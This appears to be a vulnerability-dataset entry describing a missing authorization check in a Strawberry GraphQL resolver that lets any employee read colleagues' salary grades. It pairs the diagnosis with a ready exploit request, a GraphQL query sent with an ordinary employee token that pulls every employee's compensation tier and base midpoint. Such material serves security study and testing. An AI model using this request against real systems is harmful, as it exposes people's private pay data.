diagnosis: In this Strawberry GraphQL schema, the nested field resolver compensation_grade calls a DataLoader to batch-load salary grades by employee ID. The resolver does not verify whether the requesting user is in HR or is the direct manager of the employee, allowing any staff member querying the employee directory to view colleagues' compensation tiers.
exploit_request:
POST /graphql HTTP/1.1
Host: intranet.corp.com
Authorization: Bearer <employee_token>
Content-Type: application/json

{"query": "query { employees { id fullName compensationGrade { gradeTier baseMidpoint } } }"}
